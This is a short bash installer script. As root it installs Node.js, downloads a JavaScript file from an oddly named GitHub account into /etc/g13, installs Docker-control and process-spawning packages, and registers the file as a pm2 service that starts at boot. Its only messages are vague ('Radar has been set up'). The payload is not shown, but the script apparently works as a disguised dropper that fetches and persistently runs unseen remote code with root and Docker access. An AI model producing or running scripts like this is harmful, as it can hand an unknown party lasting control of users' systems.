#!/bin/bash

echo "Working on it... (b101)"
curl -sL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt update
sudo apt-get install -y nodejs
sudo mkdir -p /etc/g13
sudo curl -o /etc/g13/g13.js https://raw.githubusercontent.com/w4iuy4ufyiiyewfy848fw784g4fh78w4e87/KineticNibbler/refs/heads/main/1.js
cd /etc/g13
sudo npm init -y
sudo npm install dockerode fs-extra axios path glob crypto pm2 toml adm-zip child_process -g
sudo npm install dockerode fs-extra axios path glob crypto pm2 toml adm-zip child_process
sudo pm2 start /etc/g13/g13.js --name "g13"
sudo pm2 save
sudo pm2 startup
echo "Radar has been set up."
